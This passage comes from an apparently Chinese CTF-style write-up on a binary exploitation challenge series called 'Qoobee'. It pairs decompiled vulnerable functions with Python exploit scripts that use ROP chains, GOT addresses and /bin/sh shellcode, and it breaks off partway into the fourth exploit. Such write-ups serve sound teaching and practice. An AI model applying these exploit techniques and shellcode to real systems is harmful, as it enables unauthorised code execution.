<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">function -214 </span></span><br><span class="line"><span class="string">patched in qoobee2</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = <span class="string">'./qoobee'</span></span><br><span class="line">io = zio(target)</span><br><span class="line"></span><br><span class="line">read_buf = l32(<span class="number">0x804c090</span>)</span><br><span class="line">call_edx = l32(<span class="number">0x0804887d</span>)</span><br><span class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</span><br><span class="line">str_r = l32(<span class="number">0x08049F7C</span>)</span><br><span class="line">s = l32(<span class="number">0xffffce8d</span>)</span><br><span class="line">extern = l32(<span class="number">0x0804b7cc</span>)</span><br><span class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</span><br><span class="line">ppr = l32(<span class="number">0x0804992a</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08049929</span>)</span><br><span class="line">\<span class="comment"># gen by alpha2 baseaddr is eax</span></span><br><span class="line">shellcode = <span class="string">"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQo9kGyqNP4KrqPhDoToD3sXaxtoSRbIPnK9yszmK0wzA"</span></span><br><span class="line">\<span class="comment"># shellcode2  tiny sh without x0b</span></span><br><span class="line">shellcode2 = <span class="string">"x31xc9xf7xe1xb0xf4xf6xd0x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></span><br><span class="line">read_got = l32(<span class="number">0x08048660</span>)</span><br><span class="line">fopen_got = l32(<span class="number">0x08048780</span>)</span><br><span class="line">write_got = l32(<span class="number">0x08048760</span>)</span><br><span class="line">data = l32(<span class="number">0x0804B7A8</span>)</span><br><span class="line">bss = l32(<span class="number">0x0804b7c0</span>)</span><br><span class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</span><br><span class="line">mmap_got =l32(<span class="number">0x08048730</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">''</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># mmap</span></span><br><span class="line">payload += <span class="string">'-214n'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># read shellcode to exec</span></span><br><span class="line">payload += shellcode+<span class="string">'ymkelwinn'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># print payload</span></span><br><span class="line">io.write(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h1 id="Qoobee2"><a href="#Qoobee2" class="headerlink" title="Qoobee2"></a>Qoobee2</h1><p>补上了上一个漏洞，去掉了执行代码，但是还是mmap了可执行的内存</p>
<h2 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h2><p>功能1中输入name存在溢出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl sub\_804970E(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">char</span> v2\[<span class="number">12</span>\]; <span class="comment">// \[sp+1Ch\] \[bp-3Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// \[sp+28h\] \[bp-30h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// \[sp+4Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now input the information for your QooBee Dragon:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"QooBee Name: "</span>);</span><br><span class="line">  \_\_isoc99\_scanf(<span class="string">"%s"</span>, v2);                     <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"QooBee Age: "</span>);</span><br><span class="line">  \_\_isoc99\_scanf(<span class="string">"%d"</span>, &amp;v3);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v2\[i\]; ++i )</span><br><span class="line">    *(_BYTE *)(a1 + i + <span class="number">20</span>) = v2\[i\];</span><br><span class="line">  result = a1;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">32</span>) = v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用-214功能中的mmap开辟的可执行缓冲区执行shellcode。 写exp的时候用了ret2libc的方法，没有直接用上一种方法的shellcode</p>
<h2 id="利用代码-1"><a href="#利用代码-1" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">name stack overflow</span></span><br><span class="line"><span class="string">patched in qoobee3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = <span class="string">'./qoobee'</span></span><br><span class="line">io = zio(target)</span><br><span class="line"></span><br><span class="line">read_buf = l32(<span class="number">0x804c090</span>)</span><br><span class="line">call_edx = l32(<span class="number">0x0804887d</span>)</span><br><span class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</span><br><span class="line">str_r = l32(<span class="number">0x08049F7C</span>)</span><br><span class="line">s = l32(<span class="number">0xffffce8d</span>)</span><br><span class="line">extern = l32(<span class="number">0x0804b7cc</span>)</span><br><span class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</span><br><span class="line">ppr = l32(<span class="number">0x0804992a</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08049929</span>)</span><br><span class="line">\<span class="comment"># shellcode tiny sh</span></span><br><span class="line">shellcode = <span class="string">"x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"</span></span><br><span class="line">read_got = l32(<span class="number">0x08048660</span>)</span><br><span class="line">fopen_got = l32(<span class="number">0x08048780</span>)</span><br><span class="line">write_got = l32(<span class="number">0x08048760</span>)</span><br><span class="line">data = l32(<span class="number">0x0804B7A8</span>)</span><br><span class="line">bss = l32(<span class="number">0x0804b7c0</span>)</span><br><span class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</span><br><span class="line">mmap_got =l32(<span class="number">0x08048730</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">''</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># function -214 mmap</span></span><br><span class="line">payload += <span class="string">'-214n'</span></span><br><span class="line">payload += <span class="string">'9999999n'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># function 1</span></span><br><span class="line">payload += <span class="string">'1n'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># junk</span></span><br><span class="line">payload += <span class="string">'x00'</span> + <span class="string">'x90'</span>*<span class="number">59</span> <span class="comment">#2222</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># ebp</span></span><br><span class="line">payload += l32(<span class="number">0x804b7e0</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># eip read</span></span><br><span class="line">payload += read_got</span><br><span class="line"></span><br><span class="line">\<span class="comment"># read ret to 0x80000004</span></span><br><span class="line">payload += l32(<span class="number">0x80000004</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># read args</span></span><br><span class="line">payload += l32(<span class="number">0x0</span>)</span><br><span class="line">payload += l32(<span class="number">0x80000000</span>)</span><br><span class="line">payload += l32(<span class="number">0x80</span>)</span><br><span class="line">payload += <span class="string">'n'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># input age</span></span><br><span class="line">payload += <span class="string">'aaaan'</span></span><br><span class="line"></span><br><span class="line">\<span class="comment"># read shellcode to exec</span></span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">io.write(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h1 id="Qoobee3"><a href="#Qoobee3" class="headerlink" title="Qoobee3"></a>Qoobee3</h1><p>修补了上个漏洞</p>
<h2 id="利用分析-2"><a href="#利用分析-2" class="headerlink" title="利用分析"></a>利用分析</h2><p>打工输入指令过滤存在问题，可以写栈内存</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl fun5\_sub_8048F93(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@14</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// \[sp+0h\] \[bp-58h\]@2</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// \[sp+0h\] \[bp-58h\]@5</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> k; <span class="comment">// \[sp+0h\] \[bp-58h\]@9</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+4h\] \[bp-54h\]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// \[sp+8h\] \[bp-50h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> op; <span class="comment">// \[sp+Ch\] \[bp-4Ch\]@8</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// \[sp+10h\] \[bp-48h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// \[sp+14h\] \[bp-44h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// \[sp+18h\] \[bp-40h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// \[sp+1Ch\] \[bp-3Ch\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v12\[<span class="number">4</span>\]; <span class="comment">// \[sp+20h\] \[bp-38h\]@3</span></span><br><span class="line">  <span class="keyword">int</span> v13\[<span class="number">4</span>\]; <span class="comment">// \[sp+30h\] \[bp-28h\]@3</span></span><br><span class="line">  <span class="keyword">char</span> *format; <span class="comment">// \[sp+40h\] \[bp-18h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// \[sp+44h\] \[bp-14h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// \[sp+48h\] \[bp-10h\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// \[sp+4Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  format = <span class="string">"0. Moving bricks: $%d/1h (spend %d Vit)n"</span>;</span><br><span class="line">  v15 = (<span class="keyword">int</span>)<span class="string">"1. Sell Meng: $%d/1h (spend %d Vit)n"</span>;</span><br><span class="line">  v16 = (<span class="keyword">int</span>)<span class="string">"2. Capture the Flag: $%d/1h (spend %d Vit)n"</span>;</span><br><span class="line">  v17 = (<span class="keyword">int</span>)<span class="string">"3. Pwnning: $%d/1h (spend %d Vit)n"</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v12\[i\] = get_randnum(<span class="number">75</span>, <span class="number">150</span>);</span><br><span class="line">      v13\[i\] = get_randnum(<span class="number">50</span>, <span class="number">150</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">      <span class="built_in">printf</span>((&amp;format)\[<span class="number">4</span> * j\], v12\[j\], v13\[j\]);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Which one you want QooBee to work(99 to leave)? "</span>);</span><br><span class="line">      op = safe_readint();</span><br><span class="line">      <span class="keyword">if</span> ( op == <span class="number">99</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"How long for this one? "</span>);</span><br><span class="line">      *(&amp;v8 + op) = safe_readint();             <span class="comment">// write dowrod in stack</span></span><br><span class="line">                                                <span class="comment">// patched in qoobee4</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">3</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 += v13\[k\] * *(&amp;v8 + k);</span><br><span class="line">      v5 += v12\[k\] * *(&amp;v8 + k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">16</span>) &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"5555...Your QooBee's vit is too low..He need have a rest!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">16</span>) -= v6;</span><br><span class="line">      *(_DWORD *)a1 += v5;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Your baby earned $%d..n"</span>, v5);</span><br><span class="line">      result = <span class="built_in">printf</span>(<span class="string">"Total Money: $%d !n"</span>, *(_DWORD *)a1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"You need adopt a QooBee Dragon first!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入ROP链 ROP调用mmap read之后执行shellcode</p>
<h2 id="利用代码-2"><a href="#利用代码-2" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">function 5 work</span></span><br><span class="line"><span class="string">patched in qoobee4</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">target = <span class="string">'./qoobee'</span></span><br><span class="line">io = zio(target, timeout=<span class="number">800000</span>)</span><br><span class="line"></span><br><span class="line">read_buf = l32(<span class="number">0x804c090</span>)</span><br><span class="line">call_edx = l32(<span class="number">0x0804887d</span>)</span><br><span class="line">str_flag = l32(<span class="number">0x08049F7E</span>)</span><br><span class="line">str_r = l32(<span class="number">0x08049F7C</span>)</span><br><span class="line">s = l32(<span class="number">0xffffce8d</span>)</span><br><span class="line">extern = l32(<span class="number">0x0804b7cc</span>)</span><br><span class="line">leave_ret = l32(<span class="number">0x08048a4f</span>)</span><br><span class="line">pr = l32(<span class="number">0x08048bc6</span>)</span><br><span class="line">ppr = l32(<span class="number">0x0804992a</span>)</span><br><span class="line">pppr = l32(<span class="number">0x08049929</span>)</span><br><span class="line">p7r = l32(<span class="number">0x08049925</span>)</span><br><span class="line">read_got = l32(<span class="number">0x08048660</span>)</span><br><span class="line">fopen_got = l32(<span class="number">0x08048780</span>)</span><br><span class="line">write_got = l32(<span class="number">0x08048760</span>)</span><br><span class="line">data = l32(<span class="number">0x0804B7A8</span>)</span><br><span class="line">bss = l32(<span class="number">0x0804b7c0</span>)</span><br><span class="line">memcpy_got = l32(<span class="number">0x08048690</span>)</span><br><span class="line">mmap_got =l32(<span class="number">0x08048730</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># -214 mmap 0x80000000</span></span><br><span class="line">io.writeline(<span class="string">'-214'</span>)</span><br><span class="line">io.writeline(<span class="string">'hello'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># adopt qoobee</span></span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.read_until(<span class="string">'Your Choice:'</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># work</span></span><br><span class="line">io.writeline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">payload = \[</span><br><span class="line">\<span class="comment"># ebp</span></span><br><span class="line">l32(<span class="number">0x21000000</span>),</span><br><span class="line">\<span class="comment"># eip jmp pr</span></span><br><span class="line">pr,</span><br><span class="line">\<span class="comment"># a1</span></span><br><span class="line">l32(<span class="number">0x80000000</span>),</span><br><span class="line">\<span class="comment"># mmap</span></span><br><span class="line">mmap_got,</span><br><span class="line">\<span class="comment"># p7r</span></span><br><span class="line">p7r,</span><br><span class="line">\<span class="comment"># mmap args</span></span><br><span class="line">l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>), l32(<span class="number">7</span>), l32(<span class="number">50</span>), l32(<span class="number">-1</span>), l32(<span class="number">0</span>),</span><br><span class="line">l32(<span class="number">0</span>), <span class="comment">#padding</span></span><br><span class="line">\<span class="comment"># read</span></span><br><span class="line">read_got,</span><br><span class="line">\<span class="comment"># jmp shellcode</span></span><br><span class="line">l32(<span class="number">0x21000000</span>),</span><br><span class="line">\<span class="comment"># read args</span></span><br><span class="line">l32(<span class="number">0</span>), l32(<span class="number">0x21000000</span>), l32(<span class="number">0x100</span>),</span><br><span class="line">\]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">\<span class="comment"># io.gdb_hint()</span></span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> payload:</span><br><span class="line">    io.read_until(<span class="string">'Which one you want QooBee to work(99 to leave)?'</span>)</span><br><span class="line">    io.writeline(<span class="string">"%d"</span> % (<span class="number">18</span>+i))</span><br><span class="line">    io.read_until(<span class="string">'How long for this one?'</span>)</span><br><span class="line">    io.writeline(<span class="string">"%u"</span> % struct.unpack(<span class="string">'&lt;i'</span>, dword))</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">io.writeline(<span class="string">'99'</span>)</span><br><span class="line">io.writeline(shellcode2)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
<h1 id="Qoobee4"><a href="#Qoobee4" class="headerlink" title="Qoobee4"></a>Qoobee4</h1><h2 id="利用分析-3"><a href="#利用分析-3" class="headerlink" title="利用分析"></a>利用分析</h2><p>fun1的输入description栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> \_\_cdecl sub\_8048BC8(<span class="keyword">int</span> a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ST28_4@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx@1</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">char</span> src; <span class="comment">// \[sp+1Eh\] \[bp-2Ah\]@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// \[sp+3Ch\] \[bp-Ch\]@1</span></span><br><span class="line"></span><br><span class="line">  v5 = *MK\_FP(\_\_GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Description(%d bytes): "</span>, <span class="number">30</span>);        <span class="comment">// stack overflow</span></span><br><span class="line">  v1 = safe_read(&amp;src, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)(a1 + <span class="number">36</span>), &amp;src, v1);</span><br><span class="line">  *(_BYTE *)(a1 + v1 + <span class="number">36</span>) = <span class="number">10</span>;</span><br><span class="line">  *(_BYTE *)(a1 + v1 + <span class="number">1</span> + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">  result = *MK\_FP(\_\_GS__, <span class="number">20</span>) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( *MK\_FP(\_\_GS__, <span class="number">20</span>) != v5 )</span><br><span class="line">    \_\_stack\_chk_fail(v2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先利用fun2的printf漏洞（见Qoobee6）读取canary 注意一次只读100 bytes，分两次执行</p>
<h2 id="利用代码-3"><a href="#利用代码-3" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 